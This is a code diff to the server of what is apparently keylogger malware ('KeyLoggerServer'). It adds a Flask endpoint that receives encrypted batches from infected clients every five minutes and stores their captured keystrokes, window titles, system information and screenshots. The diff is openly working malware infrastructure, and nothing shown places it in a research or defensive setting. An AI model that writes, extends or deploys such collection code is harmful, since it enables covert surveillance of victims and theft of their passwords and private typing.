@@ -1,3 +1,5 @@
+# KeyLoggerServer/src/api/routes.py
+
 from flask import request, jsonify
 from flask_jwt_extended import jwt_required, create_access_token
 from src.database.crud import (
@@ -8,6 +10,17 @@ from src.utils.encryption import decrypt_data
 from src.config.config_loader import load_config
 from datetime import datetime
 import json
+import logging
+
+# Setup logger
+logger = logging.getLogger(__name__)
+
+def format_response(success: bool, message: str, data=None):
+    return jsonify({
+        "success": success,
+        "message": message,
+        "data": data
+    })
 
 def register_routes(app):
     config = load_config()
@@ -110,3 +123,61 @@ def register_routes(app):
             'window_title': log.window_title,
             'key_data': log.key_data
         } for log in logs])
+
+    # Add batch processing endpoint
+    @app.route('/api/data/batch', methods=['POST'])
+    @jwt_required()
+    def receive_batch_data():
+        """
+        Receive batched data from clients (every 5 minutes)
+        """
+        try:
+            data = request.get_json()
+            
+            # Decrypt data if encrypted
+            if data.get('encrypted'):
+                decrypted = decrypt_data(data['data'].encode(), encryption_key)
+                batch_data = json.loads(decrypted)
+            else:
+                batch_data = data
+            
+            # Validate batch structure
+            if not all(k in batch_data for k in ['batch_id', 'client_id', 'entries']):
+                return format_response(False, "Invalid batch data format"), 400
+            
+            client = get_or_create_client(batch_data['client_id'])
+            processed_count = 0
+            
+            # Process each entry in the batch
+            for entry in batch_data['entries']:
+                try:
+                    if entry['type'] == 'keylog':
+                        add_key_log(
+                            client.id,
+                            datetime.fromisoformat(entry['timestamp']),
+                            entry.get('window_title', 'Unknown'),
+                            entry['key_data']
+                        )
+                    elif entry['type'] == 'system':
+                        add_system_info(client.id, json.dumps(entry['data']))
+                    elif entry['type'] == 'screenshot':
+                        add_screenshot(client.id, entry['image_data'].encode())
+                    
+                    processed_count += 1
+                    
+                except Exception as e:
+                    logger.error(f"Error processing batch entry: {str(e)}")
+                    continue
+            
+            logger.info(f"Processed batch {batch_data['batch_id']} from client {client.id}: "
+                       f"{processed_count}/{len(batch_data['entries'])} entries")
+            
+            return jsonify({
+                'status': 'success',
+                'processed': processed_count,
+                'total': len(batch_data['entries'])
+            }), 200
+            
+        except Exception as e:
+            logger.exception("Error processing batch data")
+            return format_response(False, f"Internal server error: {str(e)}"), 500
